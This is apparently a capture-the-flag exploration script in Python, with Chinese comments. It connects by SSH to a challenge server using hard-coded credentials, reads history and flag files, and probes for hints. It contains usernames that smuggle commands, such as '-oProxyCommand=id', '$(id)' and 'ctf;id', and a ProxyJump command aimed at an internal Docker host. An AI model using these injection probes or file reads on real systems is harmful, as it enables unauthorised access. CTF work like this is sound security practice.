import paramiko
import socket
import time
import sys
import subprocess

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(ssh, cmd, timeout=10):
    """执行命令并返回输出"""
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode()
    err = stderr.read().decode()
    return out + err

def test_multiple_connections():
    """测试多次连接是否有不同的响应"""
    print("[*] 测试多次连接...")
    
    for i in range(3):
        print(f"\n[*] 连接 #{i+1}")
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(HOST, PORT, USER, PASSWD)
            
            # 获取服务器信息
            transport = ssh.get_transport()
            print(f"    Server banner: {transport.get_banner()}")
            print(f"    Remote version: {transport.remote_version}")
            
            # 执行一些命令
            result = exec_cmd(ssh, "echo 'test'")
            print(f"    Command result: {result.strip()}")
            
            # 检查是否有新文件创建
            result = exec_cmd(ssh, "ls -la /tmp/ /root/ /")
            print(f"    File listing: {result[:500]}")
            
            ssh.close()
            time.sleep(1)
        except Exception as e:
            print(f"    Error: {e}")

def test_ssh_with_publickey():
    """测试公钥认证"""
    # 生成临时密钥对
    from paramiko import RSAKey
    
    print("[*] 生成临时密钥对...")
    key = RSAKey.generate(2048)
    
    print("[*] 尝试用公钥连接（预期失败，但看错误信息）...")
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(HOST, PORT, USER, pkey=key, look_for_keys=False, allow_agent=False)
        print("[+] 公钥认证成功!")
        ssh.close()
    except paramiko.AuthenticationException as e:
        print(f"[-] 公钥认证失败: {e}")
    except Exception as e:
        print(f"[-] 错误: {e}")

def test_different_usernames():
    """测试不同用户名"""
    usernames = [
        "ctf",
        "root",
        "admin",
        "-oProxyCommand=id",
        "ctf -oProxyCommand=id",
        "$(id)",
        "`id`",
        "ctf;id",
        "",
    ]
    
    for username in usernames:
        print(f"\n[*] 测试用户名: {repr(username)}")
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(HOST, PORT, username, PASSWD, timeout=10)
            print(f"[+] 登录成功!")
            result = exec_cmd(ssh, "id")
            print(f"    ID: {result.strip()}")
            ssh.close()
        except paramiko.AuthenticationException:
            print("[-] 认证失败")
        except Exception as e:
            print(f"[-] 错误: {e}")

def test_using_netcat():
    """使用netcat直接连接观察原始响应"""
    print("[*] 使用socket直接连接...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((HOST, PORT))
    
    # 读取banner
    banner = sock.recv(1024)
    print(f"[*] Banner: {banner}")
    
    # 发送我们的版本
    sock.sendall(b"SSH-2.0-TestClient\r\n")
    
    # 读取更多
    try:
        response = sock.recv(4096)
        print(f"[*] Response: {response[:200]}")
    except:
        pass
    
    sock.close()

def test_proxy_jump_native():
    """
    关键测试：使用原生SSH命令通过ProxyJump连接
    题目提示第二次SSH会有错误
    """
    print("[*] 测试ProxyJump (需要系统上有ssh命令)...")
    
    # 尝试通过ProxyJump连接到172.17.0.1
    # 使用Windows的ssh命令
    cmd = f'echo y | ssh -v -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -J {USER}@{HOST}:{PORT} ctf@172.17.0.1 id'
    
    print(f"[*] 命令: {cmd}")
    print("[*] 注意：这需要交互式输入密码，用subprocess可能会有问题")
    
    # 由于需要输入密码，这可能不会直接工作
    # 但我们可以尝试用sshpass或expect

def explore_ash_history():
    """检查.ash_history文件"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 检查历史文件...")
    print(exec_cmd(ssh, "cat /root/.ash_history"))
    print(exec_cmd(ssh, "cat ~/.ash_history"))
    
    ssh.close()

def check_for_hints():
    """检查环境中的提示"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 检查各种可能的提示位置...")
    
    locations = [
        "/flag",
        "/root/flag",
        "/home/ctf/flag",
        "/etc/motd",
        "/etc/issue",
        "/etc/banner",
        "/README",
        "/root/README",
        "/HINT",
        "/root/HINT",
    ]
    
    for loc in locations:
        result = exec_cmd(ssh, f"cat {loc}")
        if "No such file" not in result and "can't open" not in result:
            print(f"\n[+] {loc}:")
            print(result)
    
    # 检查根目录下所有文件
    print("\n[*] 根目录文件:")
    print(exec_cmd(ssh, "ls -la /"))
    print(exec_cmd(ssh, "cat /init"))
    
    ssh.close()

if __name__ == "__main__":
    print("="*50)
    print("[*] 继续探索")
    print("="*50)
    
    print("\n[1] 检查历史文件")
    explore_ash_history()
    
    print("\n[2] 检查提示")
    check_for_hints()
    
    print("\n[3] 测试不同用户名")
    test_different_usernames()
    
    print("\n[4] 测试多次连接")
    test_multiple_connections()
